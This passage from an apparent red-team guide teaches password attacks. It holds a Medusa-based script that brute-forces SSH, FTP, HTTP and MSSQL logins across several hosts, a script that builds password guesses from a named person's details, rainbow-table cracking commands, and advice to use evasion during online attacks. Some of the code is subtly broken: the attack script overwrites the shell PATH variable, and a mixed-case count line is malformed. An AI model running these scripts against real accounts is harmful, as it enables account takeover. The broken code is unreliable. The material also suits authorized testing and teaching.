git clone https://github.com/jmk-foofus/medusa.git
cd medusa
./configure
make
sudo make install
```

### Basic Usage

```bash
# Basic syntax
medusa -h [target host] -u [username] -p [password] -M [module]

# Example: SSH brute force
medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh

# Example: Multiple users and passwords
medusa -h 192.168.1.1 -U users.txt -P passwords.txt -M http

# Control parallelism
medusa -h 192.168.1.1 -U users.txt -P passwords.txt -M ftp -t 10 -T 5
```

### Example: Distributed Password Attacks

This example demonstrates using Medusa for distributed password attacks across multiple hosts:

#### 1. Setting Up Host Groups

```bash
# Create a host file with authentication information
cat > hosts.txt << EOF
192.168.1.1/ssh
192.168.1.2/ftp
192.168.1.3/http/admin/
192.168.1.4/mssql
EOF
```

#### 2. Configure Authentication Combos

```bash
# Create a combo file with username:password pairs
cat > combos.txt << EOF
admin:password123
admin:admin123
administrator:password
root:toor
user:user123
EOF
```

#### 3. Create a Multi-Protocol Attack Script

```bash
#!/bin/bash
# distributed_attack.sh - Multi-protocol distributed brute force

HOSTS_FILE=$1
COMBO_FILE=$2
THREADS=$3
MAX_HOSTS=$4

# Set defaults if not provided
[ -z "$THREADS" ] && THREADS=5
[ -z "$MAX_HOSTS" ] && MAX_HOSTS=3

if [ -z "$HOSTS_FILE" ] || [ -z "$COMBO_FILE" ]; then
    echo "Usage: $0 <hosts_file> <combo_file> [threads] [max_hosts]"
    exit 1
fi

echo "[+] Starting distributed attack with $THREADS threads per host, maximum $MAX_HOSTS hosts..."

# Split combos into chunks for distribution
TOTAL_COMBOS=$(wc -l < $COMBO_FILE)
CHUNK_SIZE=$(( TOTAL_COMBOS / MAX_HOSTS + 1 ))
split -l $CHUNK_SIZE $COMBO_FILE combo_chunk_

# Process each host
cat $HOSTS_FILE | while read line; do
    # Parse host entry
    HOST=$(echo $line | cut -d '/' -f 1)
    MODULE=$(echo $line | cut -d '/' -f 2)
    PATH=$(echo $line | cut -d '/' -f 3-)
    
    # Select a combo chunk
    CHUNK=$(ls combo_chunk_* | head -n 1)
    
    if [ -z "$CHUNK" ]; then
        echo "[-] No more combo chunks available."
        break
    fi
    
    echo "[+] Attacking $HOST using $MODULE module with combo chunk $CHUNK"
    
    # Build command based on module requirements
    CMD="medusa -h $HOST -M $MODULE -t $THREADS -C $CHUNK"
    
    # Add module-specific options
    case $MODULE in
        http|https)
            [ -n "$PATH" ] && CMD="$CMD -m DIR:/$PATH"
            ;;
        mssql)
            CMD="$CMD -m TRUSTED:FALSE"
            ;;
        smtp)
            CMD="$CMD -m AUTH:LOGIN"
            ;;
    esac
    
    # Launch attack in background
    $CMD -f -O medusa_results_$HOST.txt &
    
    # Move used chunk to prevent reuse
    mv $CHUNK ${CHUNK}_used
    
    # Limit concurrent processes
    while [ $(jobs -r | wc -l) -ge $MAX_HOSTS ]; do
        sleep 5
    done
done

# Wait for all processes to complete
wait

echo "[+] All attacks completed. Compiling results..."

# Combine results
cat medusa_results_*.txt > medusa_all_results.txt
echo "[+] Results saved to medusa_all_results.txt"

# Clean up
rm combo_chunk_*
```

This approach is effective because:
- It distributes the attack across multiple targets simultaneously
- It customizes attack parameters based on the target protocol
- It manages system resources by controlling concurrency
- It preserves results from all attacks in a consolidated output

Medusa's strength lies in its parallelism and modular architecture. While it supports fewer protocols than Hydra, it often performs better in high-concurrency scenarios where speed is essential.

## Mentalist: Wordlist Generation

Mentalist is a graphical tool for creating custom wordlists for targeted password attacks. It allows you to combine multiple techniques like word mangling, rule-based transformations, and pattern detection to create highly customized wordlists.

### Installation

```bash
# Clone the repository
git clone https://github.com/sc0tfree/mentalist.git
cd mentalist

# Install dependencies
pip3 install -r requirements.txt

# Launch Mentalist
python3 mentalist.py
```

### Profile-based Wordlists

Creating targeted wordlists based on personal or organization information:

#### 1. Personal Information Collection Script

```bash
#!/bin/bash
# targeted_wordlist.sh - Create a customized wordlist based on target information

NAME=$1
COMPANY=$2
BIRTHYEAR=$3
OUTPUT_FILE=$4

if [ -z "$NAME" ] || [ -z "$COMPANY" ] || [ -z "$BIRTHYEAR" ] || [ -z "$OUTPUT_FILE" ]; then
    echo "Usage: $0 <name> <company> <birthyear> <output_file>"
    echo "Example: $0 \"John Smith\" \"ACME Corp\" 1980 wordlist.txt"
    exit 1
fi

# Extract name components
FIRST_NAME=$(echo $NAME | cut -d ' ' -f 1 | tr '[:upper:]' '[:lower:]')
LAST_NAME=$(echo $NAME | cut -d ' ' -f 2 | tr '[:upper:]' '[:lower:]')
INITIALS=$(echo $FIRST_NAME | cut -c 1)$(echo $LAST_NAME | cut -c 1)

# Process company name
COMPANY_LOWER=$(echo $COMPANY | tr '[:upper:]' '[:lower:]' | tr -d ' ')

# Create base words
cat > base_words.txt << EOF
$FIRST_NAME
$LAST_NAME
$FIRST_NAME$LAST_NAME
$LAST_NAME$FIRST_NAME
$FIRST_NAME.$LAST_NAME
$INITIALS$LAST_NAME
$FIRST_NAME$INITIALS
$INITIALS
$COMPANY_LOWER
EOF

echo "[+] Created base words from personal information"

# Create variants with common transformations
cat base_words.txt | while read word; do
    # Original
    echo $word
    
    # Capitalized
    echo $(echo $word | sed 's/./\u&/')
    
    # With years
    echo ${word}${BIRTHYEAR}
    echo ${word}$(date +%Y)
    echo ${word}$(( $(date +%Y) - 1 ))
    
    # With common separators
    echo ${word}_${BIRTHYEAR}
    echo ${word}.${BIRTHYEAR}
    
    # With special characters
    echo ${word}!
    echo ${word}@
    echo ${word}\#
    echo ${word}\$
    echo ${word}%
    echo ${word}123
    echo ${word}123!
    
    # Common character substitutions
    echo $word | sed 's/a/4/g; s/e/3/g; s/i/1/g; s/o/0/g; s/s/\$/g'
done > $OUTPUT_FILE

echo "[+] Created $(wc -l < $OUTPUT_FILE) password candidates in $OUTPUT_FILE"
```

#### 2. Example: Creating a Targeted Wordlist for a Company

```bash
# Create a corporate wordlist
./targeted_wordlist.sh "John Smith" "TechCorp International" 1982 john_smith_wordlist.txt

# Add company-specific terms
cat > company_terms.txt << EOF
techcorp
tech
corp
international
TCI
security
network
admin
password
welcome
EOF

# Expand with company terms
for term in $(cat company_terms.txt); do
    echo $term
    echo $(echo $term | sed 's/./\u&/')
    echo ${term}2023
    echo ${term}2022
    echo ${term}!
    echo ${term}@
    echo ${term}123
done >> john_smith_wordlist.txt

# Sort and deduplicate
sort -u john_smith_wordlist.txt -o john_smith_wordlist.txt

echo "[+] Final wordlist contains $(wc -l < john_smith_wordlist.txt) unique entries"
```

This approach to wordlist generation is effective because:
- It incorporates personal and organizational information likely to be used in passwords
- It applies common password creation patterns observed in corporate environments
- It includes variations accounting for password policies requiring mixed case, numbers, etc.
- It creates a relatively small but highly targeted list, optimizing cracking efficiency

## Advanced Password Attack Strategies

Beyond the basic tools, consider these advanced strategies for more effective password cracking:

### 1. Rainbow Tables for Fast Lookup

```bash
# Install rainbowcrack
sudo apt install rainbowcrack

# Generate rainbow tables (time-intensive)
rtgen md5 loweralpha-numeric 1 7 0 1000 1000000 0

# Sort rainbow tables for lookup
rtsort *.rt

# Crack hashes using rainbow tables
rcrack *.rt -h 5f4dcc3b5aa765d61d8327deb882cf99
```

### 2. Distributed Cracking with Hashtopolis

```bash
# Set up Hashtopolis server for distributed cracking
git clone https://github.com/hashtopolis/server.git
# Follow installation instructions in repository

# Configure agents on multiple systems
# Connect to central server for distributed tasks
```

### 3. Password Analysis and Pattern Detection

```bash
# Create a password analysis script
cat > analyze_passwords.sh << 'EOF'
#!/bin/bash

PASSWORD_FILE=$1

if [ -z "$PASSWORD_FILE" ]; then
    echo "Usage: $0 <password_file>"
    exit 1
fi

echo "[+] Analyzing passwords in $PASSWORD_FILE"
echo "[+] Total passwords: $(wc -l < $PASSWORD_FILE)"

# Length distribution
echo "[+] Length distribution:"
cat $PASSWORD_FILE | awk '{ print length($0) }' | sort -n | uniq -c | sort -nr

# Character class distribution
echo "[+] Character class usage:"
echo "    Lowercase only: $(grep -c '^[a-z]*$' $PASSWORD_FILE)"
echo "    Uppercase only: $(grep -c '^[A-Z]*$' $PASSWORD_FILE)"
echo "    Mixed case: $(grep -c '[a-z]' $PASSWORD_FILE | grep -c '[A-Z]' $PASSWORD_FILE)"
echo "    With numbers: $(grep -c '[0-9]' $PASSWORD_FILE)"
echo "    With special chars: $(grep -c '[^a-zA-Z0-9]' $PASSWORD_FILE)"

# Common patterns
echo "[+] Common patterns:"
echo "    Ending with digits: $(grep -c '[a-zA-Z]*[0-9]\+$' $PASSWORD_FILE)"
echo "    Ending with single special char: $(grep -c '[a-zA-Z0-9]*[^a-zA-Z0-9]$' $PASSWORD_FILE)"
echo "    Season+Year pattern: $(grep -i -c '\(spring\|summer\|fall\|winter\|autumn\)[0-9]\{4\}' $PASSWORD_FILE)"
echo "    Month+Year pattern: $(grep -i -c '\(jan\|feb\|mar\|apr\|may\|jun\|jul\|aug\|sep\|oct\|nov\|dec\)[0-9]\{2,4\}' $PASSWORD_FILE)"

# Common words
echo "[+] Common base words (lowercase):"
cat $PASSWORD_FILE | tr '[:upper:]' '[:lower:]' | sed 's/[0-9]*//g; s/[^a-z]//g' | sort | uniq -c | sort -nr | head -20
EOF

chmod +x analyze_passwords.sh
```

## Conclusion

Password attacks remain a cornerstone of red team operations, providing critical access to systems and data. The tools covered in this chapter—Hashcat, John the Ripper, Hydra, Medusa, and Mentalist—represent different approaches to password cracking, from GPU-accelerated offline attacks to parallel online brute forcing and targeted wordlist generation.

These tools demonstrate why password security remains challenging: humans create predictable patterns, organizations implement insufficient policies, and the raw computational power available to attackers continues to increase. By understanding these tools and techniques, red teamers can effectively demonstrate the real-world risks of password vulnerabilities and help organizations implement better authentication practices.

When using these tools for legitimate red team operations, remember these key principles:

1. **Target your attacks** - Use information about the organization to create focused wordlists
2. **Layer your approach** - Start with high-probability passwords before moving to more extensive attacks
3. **Consider operational security** - Online attacks carry detection risks; use appropriate evasion techniques
4. **Analyze patterns** - Study recovered passwords to refine future attempts
5. **Document thoroughly** - Maintain detailed records of your methodology and findings for remediation recommendations

Remember that as a professional red teamer, your objective is to help organizations identify and address their security weaknesses. Always operate within the scope of your engagement and with proper authorization.
